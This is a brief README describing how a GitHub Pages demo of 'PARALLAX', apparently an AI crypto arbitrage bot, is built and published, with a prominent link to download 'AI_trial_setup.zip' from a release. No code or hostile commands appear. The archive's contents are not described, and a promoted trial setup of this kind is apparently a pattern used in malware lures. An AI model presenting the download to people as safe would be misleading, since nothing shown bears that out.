# GitHub Pages setup

[View the PARALLAX demo](https://wordystepuncl.github.io/arbitrage/) · [Download AI_trial_setup.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip)

The shared [site repository](https://github.com/wordystepuncl/wordystepuncl.github.io) hosts the prebuilt app in `arbitrage/`. Pages publishes that repository's `main` branch from `/(root)`.

## Update the live demo

1. Run `npm run build` with Node.js 22 or later.
2. Copy the generated `DEMO.html` to `arbitrage/index.html` in the site repository.
3. Commit the updated HTML to `main`. The README and demo link to the same release asset.

Public quote requests go directly from the browser to the exchanges. Regional API restrictions, rate limits and CORS policies can affect availability.
